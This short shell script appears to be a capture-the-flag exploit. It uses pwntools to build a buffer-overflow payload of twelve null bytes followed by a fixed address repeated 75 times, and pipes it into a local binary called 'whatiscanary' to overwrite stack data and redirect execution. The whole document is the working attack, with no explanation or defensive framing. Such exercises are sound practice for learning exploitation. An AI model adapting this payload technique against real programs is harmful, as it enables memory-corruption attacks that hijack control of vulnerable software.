#!/bin/sh

python -c 'from pwn import * ; print "\x00"*12 + p32(0x0804A0A0)*75' | ./whatiscanary